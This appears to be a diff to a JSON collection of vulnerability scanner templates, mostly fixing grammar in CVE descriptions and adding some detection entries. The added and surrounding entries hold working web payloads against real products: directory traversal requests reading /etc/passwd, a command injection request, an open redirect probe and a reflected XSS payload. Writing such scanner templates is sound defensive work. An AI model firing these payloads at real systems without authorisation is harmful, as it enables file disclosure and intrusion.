@@ -496,7 +496,7 @@
       "id": "CVE-2009-1151",
       "info": {
         "author": "princechaddha",
-        "description": "Setup script used to generate configuration can be fooled using a crafted POST request to include arbitrary PHP code in generated configuration file. Combined with ability to save files on server, this can allow unauthenticated users to execute arbitrary PHP code.",
+        "description": "Setup script used to create PhpMyAdmin configurations can be fooled by using a crafted POST request to include arbitrary PHP code in the generated configuration file. Combined with the ability to save files on server, this can allow unauthenticated users to execute arbitrary PHP code.",
         "name": "PhpMyAdmin Scripts/setup.php Deserialization Vulnerability",
         "reference": [
           "https://www.phpmyadmin.net/security/PMASA-2009-3/",
@@ -611,7 +611,7 @@
       "id": "CVE-2009-4223",
       "info": {
         "author": "geeknik",
-        "description": "KR is a web content-server based on Apache-PHP-MySql technology who gives to internet programmers some PHP classes semplifying database content access. Elsewere, it gives some admin and user tools to write, hyerarchize and authorize contents.",
+        "description": "KR is a web content-server based on Apache-PHP-MySql technology which gives to programmers some PHP classes simplifying database content access. Additionally, it gives some admin and user tools to write, hierarchize, and authorize contents.",
         "name": "KR-Web <= 1.1b2 RFI",
         "reference": [
           "https://sourceforge.net/projects/krw/",
@@ -1270,6 +1270,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_addressbook&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1472",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Daily Horoscope (com_horoscope) component 1.5.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Horoscope 1.5.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12167",
+          "https://www.cvedetails.com/cve/CVE-2010-1472"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_horoscope&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -2494,6 +2531,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-2920",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Foobla Suggestions (com_foobla_suggestions) component 1.5.1.2 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the controller parameter to index.php.",
+        "name": "Joomla! Component Foobla Suggestions 1.5.1.2 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12120",
+          "https://www.cvedetails.com/cve/CVE-2010-2920"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_foobla_suggestions&controller=../../../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -3832,7 +3906,7 @@
       "id": "CVE-2013-2251",
       "info": {
         "author": "exploitation,dwisiswant0,alex",
-        "description": "In Struts 2 before 2.3.15.1 the information following \"action:\", \"redirect:\" or \"redirectAction:\" is not properly sanitized. Since said information will be evaluated as OGNL expression against the value stack, this introduces the possibility to inject server side code.",
+        "description": "In Struts 2 before 2.3.15.1 the information following \"action:\", \"redirect:\", or \"redirectAction:\" is not properly sanitized. Since said information will be evaluated as an OGNL expression against the value stack, this introduces the possibility to inject server side code.",
         "name": "Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution",
         "reference": "http://struts.apache.org/release/2.3.x/docs/s2-016.html",
         "severity": "critical",
@@ -6858,7 +6932,7 @@
       "id": "CVE-2016-5649",
       "info": {
         "author": "suman_kar",
-        "description": "Vulnerability exists within the page 'BSW_cxttongr.htm' which can allow a remote attacker to access this page without any authentication. Attacker can use this password to gain administrator access of the targeted routers web interface.",
+        "description": "A vulnerability exists within the page 'BSW_cxttongr.htm' which can allow a remote attacker to access this page without any authentication. The attacker can then use this password to gain administrator access of the targeted router's web interface.",
         "name": "NETGEAR DGN2200 / DGND3700 - Admin Password Disclosure",
         "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-5649",
         "severity": "critical",
@@ -7752,7 +7826,7 @@
       "id": "CVE-2017-15715",
       "info": {
         "author": "geeknik",
-        "description": "In Apache httpd 2.4.0 to 2.4.29, the expression specified in <FilesMatch> could match '$' to a newline character in a malicious filename, rather than matching only the end of the filename. This could be exploited in environments where uploads of some files are are externally blocked, but only by matching the trailing portion of the filename.",
+        "description": "In Apache httpd 2.4.0 to 2.4.29, the expression specified in <FilesMatch> could match '$' to a newline character in a malicious filename, rather than matching only the end of the filename. This could be exploited in environments where uploads of some files are externally blocked, but only by matching the trailing portion of the filename.",
         "name": "Apache Arbitrary File Upload",
         "reference": "https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715",
         "severity": "high",
@@ -8219,7 +8293,7 @@
       "id": "CVE-2017-18638",
       "info": {
         "author": "huowuzhao",
-        "description": "send_email in graphite-web/webapp/graphite/composer/views.py in Graphite through 1.1.5 is vulnerable to SSRF. The vulnerable SSRF endpoint can be used by an attacker to have the Graphite web server request any resource. The response to this SSRF request is encoded into an image file and then sent to an e-mail address that can be supplied by the attacker. Thus, an attacker can exfiltrate any information.",
+        "description": "Graphite's send_email in graphite-web/webapp/graphite/composer/views.py in versions up to 1.1.5 is vulnerable to SSRF. The vulnerable SSRF endpoint can be used by an attacker to have the Graphite web server request any resource. The response to this SSRF request is encoded into an image file and then sent to an email address that can be supplied by the attacker. Thus, an attacker can exfiltrate any information.",
         "name": "Graphite 'graphite.composer.views.send_email' SSRF",
         "reference": [
           "http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html",
@@ -12403,6 +12477,42 @@
       ]
     },
     {
+      "id": "CVE-2019-11013",
+      "info": {
+        "author": "0x_Akoko",
+        "name": "Nimble Streamer 3.0.2-2 to 3.5.4-9 - Path Traversal",
+        "reference": [
+          "https://www.exploit-db.com/exploits/47301",
+          "https://nvd.nist.gov/vuln/detail/CVE-2019-11013"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2019,lfi,nimble"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/demo/file/../../../../../../../../etc/passwd%00filename.mp4/chunk.m3u8?nimblesessionid=1484448"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-11248",
       "info": {
         "author": 52971,
@@ -12889,7 +12999,7 @@
       "id": "CVE-2019-13462",
       "info": {
         "author": "divya_mudgal",
-        "description": "Lansweeper web application through 7.1.115.4 allows unauthenticated SQL injection via the \"row\" and \"column\" GET parameter to the /WidgetHandler.ashx?MethodName=Sort&ID=1&column=INJECTION&row=INJECTION URI.",
+        "description": "Lansweeper web application through 7.1.115.4 allows unauthenticated SQL injection via the \"row\" and \"column\" GET parameters to /WidgetHandler.ashx?MethodName=Sort&ID=1&column=INJECTION&row=INJECTION URI.",
         "name": "Lansweeper through 7.1.115.4 unauthenticated SQL injection",
         "reference": "https://www.nccgroup.com/ae/our-research/technical-advisory-unauthenticated-sql-injection-in-lansweeper/",
         "severity": "critical",
@@ -13221,7 +13331,7 @@
       "id": "CVE-2019-15107",
       "info": {
         "author": "bp0lr",
-        "description": "An issue was discovered in Webmin <=1.920. The parameter old in password_change.cgi contains a command injection vulnerability.",
+        "description": "An issue was discovered in Webmin <=1.920. The 'old' parameter in password_change.cgi contains a command injection vulnerability.",
         "name": "Webmin <= 1.920 Unauthenticated Remote Command Execution",
         "reference": "https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html",
         "severity": "high",
@@ -14560,7 +14670,7 @@
       "id": "CVE-2019-2767",
       "info": {
         "author": "madrobot",
-        "description": "Vulnerability in the BI Publisher (formerly XML Publisher) component of Oracle Fusion Middleware. The supported version that is affected are 11.1.1.9.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise BI Publisher (formerly XML Publisher).",
+        "description": "There is an XXE vulnerability in the BI Publisher (formerly XML Publisher) component of Oracle Fusion Middleware. The supported versions affected are 11.1.1.9.0, 12.2.1.3.0 and 12.2.1.4.0. This easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise BI Publisher.",
         "name": "Oracle Business Intelligence - Publisher XXE",
         "reference": [
           "https://nvd.nist.gov/vuln/detail/CVE-2019-2767",
@@ -14769,7 +14879,7 @@
       "id": "CVE-2019-5127",
       "info": {
         "author": "pikpikcu",
-        "description": "A command injection have been found in YouPHPTube Encoder. A successful attack could allow an attacker to compromise the server. Exploitable unauthenticated command injections exist in YouPHPTube Encoder 2.3 a plugin for providing encoder functionality in YouPHPTube. The parameter base64Url in /objects/getImage.php is vulnerable to a command injection attack.",
+        "description": "A command injection vulnerability has been found in YouPHPTube Encoder. A successful attack could allow an attacker to compromise the server. Exploitable unauthenticated command injections exist in YouPHPTube Encoder 2.3, a plugin for providing encoder functionality in YouPHPTube. The parameter base64Url in /objects/getImage.php is vulnerable to a command injection attack.",
         "name": "YouPHPTube Encoder RCE",
         "reference": "https://talosintelligence.com/vulnerability_reports/TALOS-2019-0917",
         "severity": "critical",
@@ -14828,7 +14938,7 @@
       "id": "CVE-2019-5418",
       "info": {
         "author": "omarkurt",
-        "description": "There is a File Content Disclosure vulnerability in Action View <5.2.2.1, <5.1.6.2, <5.0.7.2, <4.2.11.1 and v3 where specially crafted accept headers can cause contents of arbitrary files on the target system's filesystem to be exposed.",
+        "description": "There is a File Content Disclosure vulnerability in Action View <5.2.2.1, <5.1.6.2, <5.0.7.2, <4.2.11.1 and v3 where specially crafted accept headers can cause contents of arbitrary files on the target system's file system to be exposed.",
         "name": "File Content Disclosure on Rails",
         "reference": [
           "https://github.com/omarkurt/CVE-2019-5418",
@@ -15114,6 +15224,37 @@
           "raw": [
             "GET /card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20nuclei.txt%60 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\n",
             "GET /nuclei.txt HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-7275",
+      "info": {
+        "author": "0x_Akoko",
+        "name": "Open Redirect in Optergy Proton/Enterprise BMS",
+        "reference": [
+          "https://packetstormsecurity.com/files/155268/Optergy-Proton-Enterprise-BMS-2.3.0a-Open-Redirect.html",
+          "https://applied-risk.com/resources/ar-2019-008",
+          "https://cxsecurity.com/issue/WLB-2019110074"
+        ],
+        "severity": "low",
+        "tags": "cve,cve2019,redirect"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "regex": [
+                "(?m)^(?:Location\\s*?:\\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\\-_\\.@]*)example\\.com.*$"
+              ],
+              "type": "regex"
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/updating.jsp?url=https://example.com/"
           ]
         }
       ]
@@ -15899,7 +16040,7 @@
       "id": "CVE-2020-11034",
       "info": {
         "author": "pikpikcu",
-        "description": "In GLPI before version 9.4.6, there is a vulnerability that allows bypassing the open redirect protection based which is based on a regexp. This is fixed in version 9.4.6.",
+        "description": "In GLPI before version 9.4.6, there is a vulnerability that allows bypassing the open redirect protection, which is based on a regexp. This is fixed in version 9.4.6.",
         "name": "GLPI v.9.4.6 - Open redirect",
         "reference": [
           "https://github.com/glpi-project/glpi/security/advisories/GHSA-gxv6-xq9q-37hg",
@@ -17056,7 +17197,7 @@
       "id": "CVE-2020-14883",
       "info": {
         "author": "pdteam",
-        "description": "Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows high privileged attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server.",
+        "description": "Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows high privileged attackers with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server.",
         "name": "Oracle WebLogic Server Administration Console Handle RCE",
         "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14883",
         "severity": "critical",
@@ -18562,7 +18703,7 @@
       "id": "CVE-2020-25213",
       "info": {
         "author": "foulenzer",
-        "description": "The vulnerability allows unauthenticated remote attackers to upload .php files. This templates only detects the plugin, not its vulnerability.",
+        "description": "The vulnerability allows unauthenticated remote attackers to upload .php files. This template only detects the plugin, not its vulnerability.",
         "name": "WP File Manager RCE",
         "reference": [
           "https://plugins.trac.wordpress.org/changeset/2373068",
@@ -18748,7 +18889,7 @@
       "id": "CVE-2020-25540",
       "info": {
         "author": "geeknik",
-        "description": "ThinkAdmin v6 is affected by a directory traversal vulnerability. An unauthorized attacker can read arbitrarily file on a remote server via GET request encode parameter.",
+        "description": "ThinkAdmin v6 is affected by a directory traversal vulnerability. An unauthorized attacker can read arbitrary files on a remote server via GET request encode parameter.",
         "name": "ThinkAdmin 6 - Arbitrarily File Read (CVE-2020-25540)",
         "reference": "https://www.exploit-db.com/exploits/48812",
         "severity": "medium",
@@ -18921,7 +19062,7 @@
       "id": "CVE-2020-26919",
       "info": {
         "author": "gy741",
-        "description": "It was found that every section of the web could be used as a valid endpoint to submit POST requests being the action defined by the submitId argument. The problem was located in the login.html webpage, that has to be publicly available to perform login requests but does not implement any restriction for executing debug actions. This will allow users execute system commands.",
+        "description": "NETGEAR ProSAFE Plus was found to allow any HTML page as a valid endpoint to submit POST requests, allowing debug action via the submitId and debugCmd parameters. The problem is publicly exposed in the login.html webpage, which has to be publicly available to perform login requests but does not implement any restriction for executing debug actions. This will allow attackers to execute system commands.",
         "name": "NETGEAR ProSAFE Plus - Unauthenticated Remote Code Execution",
         "reference": [
           "https://research.nccgroup.com/2021/03/08/technical-advisory-multiple-vulnerabilities-in-netgear-prosafe-plus-jgs516pe-gs116ev2-switches/",
@@ -19258,7 +19399,7 @@
       "id": "CVE-2020-28871",
       "info": {
         "author": "gy741",
-        "description": "This template detects an Monitorr 1.7.6m a remote code execution vulnerability. Improper input validation and lack of authorization leading to arbitrary file upload in web application. An unauthorized attacker with web access to could upload and execute a specially crafted file leading to remote code execution within the Monitorr.",
+        "description": "This template detects a remote code execution (RCE) vulnerability in Monitorr 1.7.6m. Improper input validation and lack of authorization leads to arbitrary file uploads in the web application. An unauthorized attacker with web access to could upload and execute a specially crafted file, leading to remote code execution within the Monitorr.",
         "name": "Monitorr 1.7.6m - Unauthenticated Remote Code Execution",
         "reference": [
           "https://nvd.nist.gov/vuln/detail/CVE-2020-28871",
@@ -19290,7 +19431,7 @@
       "id": "CVE-2020-28976",
       "info": {
         "author": "LogicalHunter",
-        "description": "The Canto plugin 1.3.0 for WordPress contains a blind SSRF vulnerability. It allows an unauthenticated attacker can make a request to any internal and external server via /includes/lib/detail.php?subdomain=SSRF.",
+        "description": "The Canto plugin 1.3.0 for WordPress contains a blind SSRF vulnerability. It allows an unauthenticated attacker to make a request to any internal and external server via /includes/lib/detail.php?subdomain=SSRF.",
         "name": "Wordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated)",
         "reference": [
           "https://www.exploit-db.com/exploits/49189",
@@ -20476,7 +20617,7 @@
       "id": "CVE-2020-5847",
       "info": {
         "author": "madrobot",
-        "description": "A vulnerability in UnRaid allows remote unauthenticated attackers to execute arbirary code.",
+        "description": "A vulnerability in UnRaid allows remote unauthenticated attackers to execute arbitrary code.",
         "name": "UnRaid Remote Code Execution",
         "reference": "https://sysdream.com/news/lab/2020-02-06-cve-2020-5847-cve-2020-5849-unraid-6-8-0-unauthenticated-remote-code-execution-as-root/",
         "severity": "high",
@@ -20815,7 +20956,7 @@
       "id": "CVE-2020-7209",
       "info": {
         "author": "dwisiswant0",
-        "description": "LinuxKI v6.0-1 and earlier is vulnerable to an remote code execution which is resolved in release 6.0-2.",
+        "description": "LinuxKI v6.0-1 and earlier are vulnerable to a remote code execution. This is resolved in release 6.0-2.",
         "name": "LinuxKI Toolset 6.01 Remote Command Execution",
         "reference": [
           "http://packetstormsecurity.com/files/157739/HP-LinuxKI-6.01-Remote-Command-Injection.html",
@@ -21815,7 +21956,7 @@
       "id": "CVE-2020-9402",
       "info": {
         "author": "geeknik",
-        "description": "Django 1.11 before 1.11.29, 2.2 before 2.2.11, and 3.0 before 3.0.4 allows SQL Injection if untrusted data is used as a tolerance parameter in GIS functions and aggregates on Oracle. By passing a suitably crafted tolerance to GIS functions and aggregates on Oracle, it was possible to break escaping and inject malicious SQL.",
+        "description": "Django 1.11 before 1.11.29, 2.2 before 2.2.11, and 3.0 before 3.0.4 allow SQL Injection if untrusted data is used as a tolerance parameter in GIS functions and aggregates on Oracle. By passing a suitably crafted tolerance to GIS functions and aggregates on Oracle, it is possible to break character escaping and inject malicious SQL.",
         "name": "Django SQL Injection",
         "reference": [
           "https://github.com/vulhub/vulhub/tree/master/django/CVE-2020-9402",
@@ -21850,7 +21991,7 @@
       "id": "CVE-2020-9425",
       "info": {
         "author": "madrobot",
-        "description": "An issue was discovered in includes/head.inc.php in rConfig before 3.9.4. An unauthenticated attacker can retrieve saved cleartext credentials via a GET request to settings.php. Because the application was not exiting after a redirect is applied, the rest of the page still executed, resulting in the disclosure of cleartext credentials in the response.",
+        "description": "An issue was discovered in includes/head.inc.php in rConfig before 3.9.4. An unauthenticated attacker can retrieve saved cleartext credentials via a GET request to settings.php. Because the application does not exit after a redirect is applied, the rest of the page still executed, resulting in the disclosure of cleartext credentials in the response.",
         "name": "rConfig Unauthenticated Sensitive Information Disclosure",
         "reference": [
           "https://blog.hivint.com/rconfig-3-9-3-unauthenticated-sensitive-information-disclosure-ead4ed88f153",
@@ -22283,6 +22424,46 @@
           "raw": [
             "GET /images/..%2finfo.html HTTP/1.1\nHost: {{Hostname}}\nReferer: {{{{BaseURL}}}}/info.html\n",
             "GET /images/..%2fcgi/cgi_i_filter.js?_tn={{trimprefix(base64_decode(httoken), base64_decode(\"R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\"))}} HTTP/1.1\nHost: {{Hostname}}\nCookie: lang=8; url=ping.html; mobile=false;\nReferer: {{BaseURL}}/info.html\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 178\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-20114",
+      "info": {
+        "author": "push4d",
+        "description": "When installed following the default/recommended settings, TCExam <= 14.8.1 allowed unauthenticated users to access the /cache/backup/ directory, which included sensitive database backup files.",
+        "name": "TCExam <= 14.8.1 Exposure of Sensitive Information to an Unauthorized Actor",
+        "reference": [
+          "https://es-la.tenable.com/security/research/tra-2021-32?tns_redirect=true",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-20114"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2021,tcexam,disclosure"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "Index of /cache/backup",
+                "Parent Directory",
+                ".sql.gz"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cache/backup/"
           ]
         }
       ]
@@ -22732,7 +22913,7 @@
       "id": "CVE-2021-21972",
       "info": {
         "author": "dwisiswant0",
-        "description": "The vulnerability allows unauthenticated remote attackers to upload file leading to remote code execution (RCE). This templates only detects the plugin.",
+        "description": "The vulnerability allows unauthenticated remote attackers to upload files leading to remote code execution (RCE). This templates only detects the plugin.",
         "name": "VMware vCenter Unauthenticated RCE",
         "reference": "https://swarm.ptsecurity.com/unauth-rce-vmware/",
         "severity": "critical",
@@ -24932,7 +25113,7 @@
       "id": "CVE-2021-28854",
       "info": {
         "author": "pdteam",
-        "description": "VICIdial's Web Client contains many sensitive files that can be access from the client side. These files contain mysqli logs, auth logs, debug information, successful and unsuccessful login attempts with their corresponding IP's, User-Agents, credentials and much more. This information can be leveraged by an attacker to gain further access to VICIdial systems. This vulnerability affects all versions as of 20/5/21",
+        "description": "VICIdial's Web Client contains many sensitive files that can be accessed from the client side. These files contain mysqli logs, auth logs, debug information, successful and unsuccessful login attempts with their corresponding IP's, User-Agents, credentials and much more. This information can be leveraged by an attacker to gain further access to VICIdial systems. This vulnerability affects all versions as of 20/5/2021.",
         "name": "VICIdial - Multiple sensitive Information disclosure",
         "reference": "https://github.com/JHHAX/VICIdial",
         "severity": "high",
@@ -25285,6 +25466,51 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/new/newhttp://example.com"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-29625",
+      "info": {
+        "author": "daffainfo",
+        "description": "Adminer is open-source database management software. A cross-site scripting vulnerability in Adminer versions 4.6.1 to 4.8.0 affects users of MySQL, MariaDB, PgSQL and SQLite. XSS is in most cases prevented by strict CSP in all modern browsers. The only exception is when Adminer is using a `pdo_` extension to communicate with the database (it is used if the native extensions are not enabled). In browsers without CSP, Adminer versions 4.6.1 to 4.8.0 are affected. The vulnerability is patched in version 4.8.1. As workarounds, one can use a browser supporting strict CSP or enable the native PHP extensions (e.g. `mysqli`) or disable displaying PHP errors (`display_errors`).",
+        "name": "Adminer reflected XSS via the table parameter",
+        "reference": [
+          "https://sourceforge.net/p/adminer/bugs-and-features/797/",
+          "https://www.cvedetails.com/cve/CVE-2021-29625/"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,adminer,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?server=db&username=root&db=mysql&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -26015,7 +26241,7 @@
       "id": "CVE-2021-33221",
       "info": {
         "author": "geeknik",
-        "description": "A 'service details' API endpoint discloses system and configuration information to an attacker without requiring authentication. This information includes DNS and NTP servers that the devices uses for time and host resolution. It also includes the internal hostname and IoT Controller version. A fully configured device in production may leak other, more sensitive information (API keys and tokens).",
+        "description": "A 'service details' API endpoint discloses system and configuration information to an attacker without requiring authentication. This information includes DNS and NTP servers that the devices use for time and host resolution. It also includes the internal hostname and IoT Controller version. A fully configured device in production may leak other, more sensitive information (API keys and tokens).",
         "name": "CommScope Ruckus IoT Controller Unauthenticated Service Details",
         "reference": "https://www.commscope.com/globalassets/digizuite/917216-faq-security-advisory-id-20210525-v1-0.pdf",
         "severity": "medium",
